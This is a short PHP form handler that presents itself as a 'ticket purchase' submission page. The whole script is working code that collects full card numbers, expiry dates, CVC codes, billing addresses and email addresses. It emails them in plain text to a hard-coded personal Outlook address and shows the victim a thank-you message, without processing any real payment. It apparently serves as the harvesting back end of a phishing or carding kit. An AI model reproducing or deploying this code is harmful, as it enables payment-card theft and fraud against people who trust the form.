<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $card_number = htmlspecialchars($_POST['card_number']);
    $expiry_date = htmlspecialchars($_POST['expiry_date']);
    $cvc = htmlspecialchars($_POST['cvc']);
    $address = htmlspecialchars($_POST['address']);
    $city = htmlspecialchars($_POST['city']);
    $state = htmlspecialchars($_POST['state']);
    $postal_code = htmlspecialchars($_POST['postal_code']);
    $email = htmlspecialchars($_POST['email']);

    $to = "javierantonio78893@outlook.com"; // Your email address
    $subject = "New Ticket Purchase Submission";
    $message = "
    A new ticket purchase submission has been received:

    Card Number: $card_number
    Expiration Date: $expiry_date
    CVC: $cvc
    Address: $address
    City: $city
    State/Province: $state
    Postal Code: $postal_code
    Email: $email
    ";

    $headers = "From: no-reply@example.com\r\n"; // Replace with your domain or a suitable 'From' address

    if (mail($to, $subject, $message, $headers)) {
        echo "Thank you! Your submission has been received.";
    } else {
        echo "Sorry, there was an error sending your submission. Please try again later.";
    }
} else {
    echo "Invalid request method.";
}
?>
